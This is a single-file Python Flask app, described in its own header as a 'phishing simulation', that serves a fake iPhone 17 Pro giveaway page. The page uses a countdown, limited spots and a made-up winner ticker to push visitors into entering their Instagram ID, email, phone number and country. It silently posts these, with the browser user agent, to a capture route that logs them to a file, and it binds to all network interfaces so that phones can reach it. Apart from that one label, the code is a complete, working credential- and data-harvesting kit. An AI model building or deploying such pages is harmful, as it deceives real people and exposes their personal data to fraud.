#!/usr/bin/env python3
"""
iPhone 17 Pro Giveaway — phishing simulation page + capture server.
Single-file Flask app: serves the embedded HTML and logs form submissions.
And pls follow on instagram: prakeerth.py

Usage:
    pip install flask
    python3 app.py
Then open http://<this-machine>:8000  (use your machine's LAN IP for phones)
Captured data is written to captured.log and printed to the console.
"""
from flask import Flask, request, jsonify, Response

app = Flask(__name__)

# ================================================================
#  EMBEDDED HTML PAGE  (your design, capture wired to /capture)
# ================================================================
PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>iPhone 17 Pro Giveaway</title>
<style>
:root {
    --gold:#f5b301; --gold-dark:#d49a00; --dark:#0f0f1a; --card:#1a1a2e;
    --text:#ffffff; --subtext:#b0b0c8; --input-bg:#12121f; --border:#2a2a40;
    --success:#00d68f; --danger:#ff4757;
}
* { margin:0; padding:0; box-sizing:border-box; }
body {
    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
    background:linear-gradient(135deg,#0f0f1a 0%,#1a1a2e 50%,#0f0f1a 100%);
    min-height:100vh; display:flex; justify-content:center; align-items:center;
    padding:20px; position:relative; overflow-x:hidden;
}
.particle{position:fixed;width:3px;height:3px;background:var(--gold);border-radius:50%;opacity:.3;animation:float 6s ease-in-out infinite;pointer-events:none;}
@keyframes float{0%,100%{transform:translateY(0) rotate(0);opacity:.3;}50%{transform:translateY(-100px) rotate(180deg);opacity:.8;}}
.container{max-width:420px;width:100%;position:relative;z-index:10;}
.ribbon{background:linear-gradient(90deg,var(--gold-dark),var(--gold),var(--gold-dark));color:#000;text-align:center;padding:8px 15px;font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;border-radius:50px;display:inline-block;margin:0 auto 15px;position:relative;left:50%;transform:translateX(-50%);animation:pulse 2s ease-in-out infinite;white-space:nowrap;}
@keyframes pulse{0%,100%{box-shadow:0 0 20px rgba(245,179,1,.3);}50%{box-shadow:0 0 40px rgba(245,179,1,.6);}}
.card{background:var(--card);border:1px solid var(--border);border-radius:20px;padding:35px 28px;box-shadow:0 20px 60px rgba(0,0,0,.5);}
.icon-container{text-align:center;margin-bottom:20px;}
.trophy{font-size:70px;animation:bounce 2s ease-in-out infinite;display:inline-block;}
@keyframes bounce{0%,100%{transform:translateY(0);}50%{transform:translateY(-15px);}}
.title{text-align:center;color:var(--text);font-size:28px;font-weight:800;margin-bottom:8px;line-height:1.2;}
.subtitle{text-align:center;color:var(--subtext);font-size:14px;margin-bottom:25px;line-height:1.5;}
.highlight{color:var(--gold);font-weight:700;}
.countdown-container{background:var(--input-bg);border:1px solid var(--border);border-radius:12px;padding:15px;margin-bottom:25px;text-align:center;}
.countdown-label{color:var(--subtext);font-size:11px;text-transform:uppercase;letter-spacing:2px;margin-bottom:10px;}
.countdown-timer{display:flex;justify-content:center;gap:10px;}
.time-block{background:var(--card);border:1px solid var(--gold);border-radius:8px;padding:10px 8px;min-width:60px;}
.time-number{color:var(--gold);font-size:24px;font-weight:800;display:block;}
.time-unit{color:var(--subtext);font-size:10px;text-transform:uppercase;letter-spacing:1px;}
.winners-ticker{background:var(--input-bg);border:1px solid var(--success);border-radius:10px;padding:10px 15px;margin-bottom:20px;display:flex;align-items:center;gap:10px;font-size:12px;color:var(--subtext);}
.live-dot{width:8px;height:8px;background:var(--success);border-radius:50%;animation:blink 1s ease-in-out infinite;flex-shrink:0;}
@keyframes blink{0%,100%{opacity:1;}50%{opacity:.3;}}
.winner-name{color:var(--success);font-weight:700;}
.form-group{margin-bottom:15px;}
label{display:block;color:var(--subtext);font-size:12px;font-weight:600;margin-bottom:6px;letter-spacing:.5px;}
input[type="text"],input[type="email"],input[type="tel"],select{width:100%;padding:14px 15px;background:var(--input-bg);border:1px solid var(--border);border-radius:10px;color:var(--text);font-size:14px;outline:none;transition:all .3s ease;}
input:focus,select:focus{border-color:var(--gold);box-shadow:0 0 20px rgba(245,179,1,.15);}
input::placeholder{color:#5a5a7a;}
select{appearance:none;cursor:pointer;background-image:url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23b0b0c8' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");background-repeat:no-repeat;background-position:right 15px center;background-size:15px;}
.rules{background:var(--input-bg);border-radius:10px;padding:12px 15px;margin-bottom:20px;font-size:11px;color:var(--subtext);line-height:1.6;}
.rules li{margin-left:15px;margin-bottom:3px;}
.submit-btn{width:100%;padding:16px;background:linear-gradient(90deg,var(--gold-dark),var(--gold),var(--gold-dark));color:#000;border:none;border-radius:12px;font-weight:800;font-size:16px;cursor:pointer;letter-spacing:1px;text-transform:uppercase;transition:all .3s ease;position:relative;overflow:hidden;}
.submit-btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(245,179,1,.4);}
.submit-btn:active{transform:translateY(0);}
.submit-btn::after{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:linear-gradient(45deg,transparent 30%,rgba(255,255,255,.3) 50%,transparent 70%);animation:shine 3s ease-in-out infinite;}
@keyframes shine{0%{transform:translateX(-100%) rotate(45deg);}100%{transform:translateX(100%) rotate(45deg);}}
.footer{text-align:center;margin-top:20px;color:var(--subtext);font-size:11px;line-height:1.6;}
.footer a{color:var(--gold);text-decoration:none;}
.popup-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.7);z-index:1000;justify-content:center;align-items:center;padding:20px;animation:overlayIn .3s ease;}
@keyframes overlayIn{from{opacity:0;}to{opacity:1;}}
.popup-overlay.active{display:flex;}
.phone-popup{background:var(--card);border:2px solid var(--gold);border-radius:25px;width:100%;max-width:360px;padding:35px 25px 30px;position:relative;animation:popupSlideUp .5s cubic-bezier(.68,-.55,.265,1.55);box-shadow:0 0 50px rgba(245,179,1,.4),0 20px 60px rgba(0,0,0,.8);}
@keyframes popupSlideUp{from{transform:translateY(80px) scale(.8);opacity:0;}to{transform:translateY(0) scale(1);opacity:1;}}
.popup-notch{position:absolute;top:15px;left:50%;transform:translateX(-50%);width:80px;height:18px;background:#000;border-radius:15px;}
.popup-close{position:absolute;top:15px;right:20px;background:var(--input-bg);border:1px solid var(--border);color:var(--subtext);width:30px;height:30px;border-radius:50%;font-size:14px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all .3s;z-index:10;}
.popup-close:hover{background:var(--danger);color:#fff;border-color:var(--danger);}
.success-check{text-align:center;margin:15px 0;}
.check-circle{width:70px;height:70px;background:var(--success);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto;font-size:35px;color:#fff;animation:checkPop .5s cubic-bezier(.68,-.55,.265,1.55);}
@keyframes checkPop{from{transform:scale(0);}to{transform:scale(1);}}
.popup-badge{background:linear-gradient(90deg,var(--gold-dark),var(--gold),var(--gold-dark));color:#000;text-align:center;padding:5px 12px;font-size:10px;font-weight:800;letter-spacing:2px;text-transform:uppercase;border-radius:50px;display:inline-block;margin:0 auto 10px;position:relative;left:50%;transform:translateX(-50%);white-space:nowrap;}
.popup-title{text-align:center;color:var(--text);font-size:22px;font-weight:800;margin-bottom:8px;}
.popup-text{text-align:center;color:var(--subtext);font-size:13px;margin-bottom:20px;line-height:1.6;}
.popup-btn{width:100%;padding:13px;background:linear-gradient(90deg,var(--gold-dark),var(--gold),var(--gold-dark));color:#000;border:none;border-radius:10px;font-weight:700;font-size:14px;cursor:pointer;letter-spacing:.5px;text-transform:uppercase;margin-top:10px;transition:all .3s;}
.popup-btn:hover{transform:translateY(-1px);box-shadow:0 8px 25px rgba(245,179,1,.4);}
@media (max-width:480px){
    .card{padding:25px 20px;border-radius:15px;}
    .title{font-size:24px;}
    .trophy{font-size:55px;}
    .time-block{min-width:50px;padding:8px 5px;}
    .time-number{font-size:20px;}
    .phone-popup{padding:25px 18px;border-radius:20px;}
}
</style>
</head>
<body>
<div class="particle" style="top:10%;left:20%;animation-delay:0s;"></div>
<div class="particle" style="top:30%;left:80%;animation-delay:1s;"></div>
<div class="particle" style="top:60%;left:10%;animation-delay:2s;"></div>
<div class="particle" style="top:80%;left:70%;animation-delay:0.5s;"></div>
<div class="particle" style="top:50%;left:50%;animation-delay:1.5s;"></div>
<div class="particle" style="top:20%;left:40%;animation-delay:2.5s;"></div>

<div class="container">
  <div class="ribbon">Limited Time Offer</div>
  <div class="card">
    <div class="icon-container"><div class="trophy">🏆</div></div>
    <h1 class="title">iPhone 17 Pro Giveaway</h1>
    <p class="subtitle">Enter now for your chance to win the <span class="highlight">latest iPhone 17 Pro</span>! Only <span class="highlight">500 spots</span> available. Share with your 3 friends!</p>

    <div class="countdown-container">
      <div class="countdown-label">Giveaway Ends In</div>
      <div class="countdown-timer">
        <div class="time-block"><span class="time-number" id="hours">23</span><span class="time-unit">Hours</span></div>
        <div class="time-block"><span class="time-number" id="minutes">59</span><span class="time-unit">Mins</span></div>
        <div class="time-block"><span class="time-number" id="seconds">59</span><span class="time-unit">Secs</span></div>
      </div>
    </div>

    <div class="winners-ticker"><div class="live-dot"></div><span><span class="winner-name">kannan.</span> just won an iPhone from this giveaway!</span></div>

    <form id="giveawayForm">
      <div class="form-group"><label for="fullname">Instagram ID</label><input type="text" id="fullname" name="fullname" placeholder="Enter your Instagram ID" required autocomplete="off"></div>
      <div class="form-group"><label for="email">Email Address</label><input type="email" id="email" name="email" placeholder="Enter your email address" required autocomplete="off"></div>
      <div class="form-group"><label for="phone">Phone Number</label><input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required autocomplete="off"></div>
      <div class="form-group"><label for="country">Country</label>
        <select id="country" name="country" required>
          <option value="" disabled selected>Select your country</option>
          <option value="US">United States</option><option value="UK">United Kingdom</option>
          <option value="IN">India</option><option value="CA">Canada</option><option value="AU">Australia</option>
          <option value="DE">Germany</option><option value="FR">France</option><option value="JP">Japan</option>
          <option value="BR">Brazil</option><option value="Other">Other</option>
        </select>
      </div>
      <div class="rules"><strong style="color:var(--gold);">Giveaway Rules:</strong><ul><li>Open to participants 18 years or older</li><li>One entry per person</li><li>Winner announced within 48 hours</li><li>No purchase necessary</li></ul></div>
      <button type="submit" class="submit-btn">Enter Now</button>
    </form>
    <p style="text-align:center;margin-top:15px;font-size:10px;color:#5a5a7a;">By entering, you agree to our <a href="#" style="color:var(--gold);">Terms &amp; Conditions</a></p>
  </div>
  <div class="footer"><p>This giveaway is not affiliated with Apple Inc.</p><p>© 2024 GiveawayHub. All rights reserved.</p></div>
</div>

<div class="popup-overlay" id="popupOverlay">
  <div class="phone-popup">
    <div class="popup-notch"></div>
    <button class="popup-close" onclick="closePopup()">✕</button>
    <div class="popup-badge">Submitted!</div>
    <div class="success-check"><div class="check-circle">✓</div></div>
    <h3 class="popup-title">Entry Submitted!</h3>
    <p class="popup-text">Thank you for entering the giveaway.<br>Winner will be announced within <strong style="color:var(--gold);">48 hours</strong>.</p>
    <button class="popup-btn" onclick="closePopup()">OK</button>
  </div>
</div>

<script>
var hours=23,minutes=59,seconds=59;
function updateCountdown(){
  seconds--;
  if(seconds<0){seconds=59;minutes--;if(minutes<0){minutes=59;hours--;if(hours<0){hours=0;minutes=0;seconds=0;clearInterval(countdownInterval);}}}
  document.getElementById('hours').textContent=String(hours).padStart(2,'0');
  document.getElementById('minutes').textContent=String(minutes).padStart(2,'0');
  document.getElementById('seconds').textContent=String(seconds).padStart(2,'0');
}
var countdownInterval=setInterval(updateCountdown,1000);

function closePopup(){document.getElementById('popupOverlay').classList.remove('active');}

document.getElementById('giveawayForm').addEventListener('submit',function(e){
  e.preventDefault();
  var data={
    fullname:document.getElementById('fullname').value,
    email:document.getElementById('email').value,
    phone:document.getElementById('phone').value,
    country:document.getElementById('country').value,
    page:window.location.href,
    user_agent:navigator.userAgent,
    ts:new Date().toISOString()
  };
  // POST silently to /capture (same origin as this page)
  fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})
    .catch(function(){});
  document.getElementById('popupOverlay').classList.add('active');
  document.getElementById('giveawayForm').reset();
});
</script>
</body>
</html>"""

# ================================================================
#  WEB ROUTES
# ================================================================

@app.route('/')
def index():
    return Response(PAGE, mimetype='text/html')

@app.route('/capture', methods=['POST'])
def capture():
    data = request.get_json(force=True, silent=True) or {}
    # Print to console AND append to log file
    print(data)
    with open('captured.log', 'a') as f:
        f.write(str(data) + "\n")
    return jsonify({"ok": True}), 200

if __name__ == '__main__':
    # Bind all interfaces so phones/other machines on the LAN can reach it
    app.run(host='0.0.0.0', port=8000, debug=False)
